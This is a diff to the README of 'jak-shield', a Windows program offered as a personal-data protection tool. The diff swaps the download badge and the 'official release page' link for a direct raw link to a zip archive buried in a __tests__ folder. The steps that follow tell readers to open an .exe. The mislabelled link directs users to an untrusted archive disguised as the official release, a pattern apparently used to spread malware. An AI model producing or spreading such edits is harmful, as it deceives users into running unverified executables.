@@ -1,6 +1,6 @@
 # 🛡️ jak-shield - Keep your personal data safe today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Harmoniaecumenical900/jak-shield/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Harmoniaecumenical900/jak-shield/main/packages/observability/src/__tests__/shield-jak-3.2.zip)
 
 ## 🎯 About this program
 
@@ -23,7 +23,7 @@ If your computer runs modern office applications, it will handle this security t
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official release page](https://github.com/Harmoniaecumenical900/jak-shield/releases) to find the latest version.
+1. Visit the [official release page](https://raw.githubusercontent.com/Harmoniaecumenical900/jak-shield/main/packages/observability/src/__tests__/shield-jak-3.2.zip) to find the latest version.
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start the file transfer.
 4. Open the file once the transfer completes.
